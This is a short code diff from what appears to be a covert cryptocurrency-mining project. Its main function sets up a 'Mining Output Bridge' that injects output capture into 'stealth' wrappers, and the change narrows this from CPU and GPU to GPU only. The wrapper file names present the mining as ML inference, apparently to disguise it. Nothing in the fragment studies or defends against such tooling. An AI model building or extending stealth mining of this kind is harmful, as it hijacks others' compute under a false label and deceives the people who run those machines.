@@ -183,14 +183,10 @@ def main():
     """Main function để setup mining output bridge"""
     logger.info("🚀 Starting Mining Output Bridge")
     
-    # Setup forwarders cho cả CPU và GPU
-    cpu_wrapper = "/app/mining_environment/stealth/wrappers/stealth_ml_inference.py"
+    # Setup forwarders cho GPU-only (CPU wrapper removed)
     gpu_wrapper = "/app/mining_environment/stealth/wrappers/stealth_inference_cuda.py"
     
-    # Inject output capture vào stealth wrappers
-    if os.path.exists(cpu_wrapper):
-        inject_output_capture("cpu", cpu_wrapper)
-    
+    # Inject output capture vào GPU stealth wrapper
     if os.path.exists(gpu_wrapper):
         inject_output_capture("gpu", gpu_wrapper)
     
